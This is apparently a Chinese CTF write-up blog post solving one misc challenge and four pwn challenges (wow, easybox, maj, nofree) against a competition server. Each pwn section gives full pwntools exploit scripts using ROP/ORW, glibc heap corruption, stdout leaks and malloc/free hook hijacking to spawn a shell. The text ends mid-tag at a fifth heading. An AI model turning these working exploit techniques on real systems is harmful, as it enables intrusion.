    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>PWN终于不是背锅了（流泪）。题目感觉有点ez，不过做出来的4道题PWN都是要概率的，这就很看脸了，全程脸黑的我每个脚本都打了二三十遍才拿到flag。</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ctf-game"><a href="#ctf-game" class="headerlink" title="ctf_game"></a>ctf_game</h2><p>打开压缩包，直接文本打开文件即可看到flag。</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="wow"><a href="#wow" class="headerlink" title="wow"></a>wow</h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>与2020 RCTF的bf类似，缓冲区紧接着的指令指针存在off by one，可以控制该指针在栈上任意输入。</p><p>劫持返回地址构造rop，并将指令指针还原回去（存在check）。</p><p>因为禁用了execute系统调用，所以需要通过ORW方式获取flag。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./wow"</span>)</span><br><span class="line">p = remote(<span class="string">"101.200.53.148"</span>,<span class="string">"15324"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004047ba</span></span><br><span class="line">pop_rsi=<span class="number">0x0000000000407578</span></span><br><span class="line">pop_rdx=<span class="number">0x000000000040437f</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000404c41</span></span><br><span class="line">pop_rax_rdx_rbx=<span class="number">0x000000000053048a</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x000000000041768f</span></span><br><span class="line">syscall = <span class="number">0x00000000004dc054</span></span><br><span class="line">read = <span class="number">0x52A670</span></span><br><span class="line">bss = <span class="number">0x5d3520</span></span><br><span class="line">puts = <span class="number">0x4D47B4</span></span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += <span class="string">'/flag'</span>+<span class="string">'\x00'</span>*<span class="number">3</span></span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(mov_rdi_rax)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += p64(<span class="number">0x2</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall)<span class="comment">#open</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(bss+<span class="number">0x100</span>)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(syscall)<span class="comment">#read</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(bss+<span class="number">0x100</span>)</span><br><span class="line">rop += p64(puts)<span class="comment">#puts</span></span><br><span class="line">rop += <span class="string">"^&#123;@^&#125;$"</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:"</span>)</span><br><span class="line">p.sendline(<span class="string">"^&#123;@^&#125;&amp;"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">byte = u32(p.recv(<span class="number">1</span>)+<span class="string">'\x00'</span>*<span class="number">3</span>) <span class="number">-1</span></span><br><span class="line">p.recvuntil(<span class="string">"continue?"</span>)</span><br><span class="line">p.send(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:"</span>)</span><br><span class="line">p.sendline(<span class="string">"^&#123;@^&#125;$"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.send(p64(byte+<span class="number">0x48</span>)[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">"continue?"</span>)</span><br><span class="line">p.send(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:"</span>)</span><br><span class="line">p.send(rop+<span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x00000000004dc054')</span></span><br><span class="line">p.send(p64(byte)[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">"continue?"</span>)</span><br><span class="line">p.send(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>存在off by one漏洞，利用漏洞可以实现chunk extend，得到两个指向同一地址的指针。然后利用堆错位来伪造size位等，实现将同一个地址先后free进fastbin和unsortbin，进而利用main_arean劫持stdout结构(1/16概率)，使用io_leak的方法获取到libc地址。</p><p>接着用fastbin的double free漏洞劫持__malloc_hook，从而getshell。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#p = process("./pwn")</span></span><br><span class="line">p = remote(<span class="string">"101.200.53.148"</span>,<span class="string">"34521"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe8</span>,<span class="string">'a'</span>*<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf8</span>,<span class="string">'\xdd\x25'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe8</span>,<span class="string">'a'</span>*<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3C56A3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0xe8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0xe8</span>,<span class="string">'a'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0xc</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0xb</span>+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>)+p64(libc.address+one[<span class="number">3</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x48</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#exp()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure><h2 id="maj"><a href="#maj" class="headerlink" title="maj"></a>maj</h2><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>存在大量混淆，可以直接忽略。</p><p>free时未清空堆指针，从而可以利用堆错位来伪造size位等，实现将同一个地址先后free进fastbin和unsortbin，进而利用main_arean劫持stdout结构(1/16概率)，使用io_leak的方法获取到libc地址。</p><p>并且因为没有开启pie，因而可以劫持堆指针。</p><p>构造一个堆指针指向<code>__free_hook</code>，将其改为system，从而实现getshell。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./pwn")</span></span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">p = remote(<span class="string">"101.200.53.148"</span> ,<span class="string">"15423"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please answer the question"</span>)</span><br><span class="line">p.sendline(<span class="string">"82"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"you are right"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"start_the_game,yes_or_no?"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index ?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index ?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"__new_content ?"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">'aaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x603260</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,p32(<span class="number">0xff</span>)*<span class="number">24</span>)</span><br><span class="line">edit(<span class="number">4</span>,p32(<span class="number">0xff</span>)*<span class="number">28</span>+p64(<span class="number">0x6032e0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>))</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x48</span>+p64(<span class="number">0x21</span>))<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaa'</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x70'</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x80'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x70'</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x80'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\xdd\x25'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x70'</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3C56A3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(<span class="number">2</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure><h2 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h2><p>strdup存在00截断，因而可以溢出堆块。通过构造使top chunk进入0x70的fastbin中，从而控制堆指针，达到任意写。</p><p>这里采用爆破第4位（概率为1/16）的方式将read改为onegadget，从而getshell。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#p = process("./pwn")</span></span><br><span class="line">p = remote(<span class="string">"101.200.53.148"</span>,<span class="string">"12301"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x0fe1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x18</span>):</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">"a"</span>*<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x71</span>,<span class="string">"a"</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"a"</span>*<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x71</span>,<span class="string">"a"</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x71</span>,<span class="string">"a"</span>*<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>))</span><br><span class="line"><span class="comment">#0-&gt;heap_ptr</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>)+p64(<span class="number">0x0602048</span>)+p64(<span class="number">0xffff</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'\x64\x03'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400934')</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#exp()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure><h2 id="babyjsc"><a href="#babyjsc" class="headerlink" 